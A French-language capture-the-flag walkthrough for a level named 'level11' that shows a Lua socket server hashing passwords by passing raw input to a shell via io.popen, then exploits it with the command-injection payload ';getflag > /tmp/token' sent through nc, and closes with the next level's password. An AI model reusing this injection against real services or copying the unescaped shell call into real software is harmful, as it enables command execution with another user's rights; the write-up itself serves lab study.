On commence avec un script "level11.lua" :

    #!/usr/bin/env lua
    local socket = require("socket")
    local server = assert(socket.bind("127.0.0.1", 5151))

    function hash(pass)
    prog = io.popen("echo "..pass.." | sha1sum", "r")
    data = prog:read("*all")
    prog:close()

    data = string.sub(data, 1, 40)

    return data
    end


    while 1 do
    local client = server:accept()
    client:send("Password: ")
    client:settimeout(60)
    local l, err = client:receive()
    if not err then
        print("trying " .. l)
        local h = hash(l)

        if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
            client:send("Erf nope..\n");
        else
            client:send("Gz you dumb*\n")
        end

    end

    client:close()
    end


Il s'agit d'un script qui va ecouter sur le port 5151, et va attendre de recevoir un input. Il va prendre l'input, puis hasher,
et renvoyer differentes reponses en fonction du resultat... Mais en realite, ca nous importe peu,
car on va faire une injection pour exploiter le fait que le script a les droits flag11 :

    nc localhost 5151
    Password : ;getflag > /tmp/token

Le script va se lancer normalement, et donc nous renvoyer "Erf nope", mais comme on a fait une injection de commande shell,
getflag est egalement lance, donc si on fait un cat dans notre fichier /tmp/token, on va y trouver notre password



password12 : fa6v5ateaw21peobuub8ipe6s
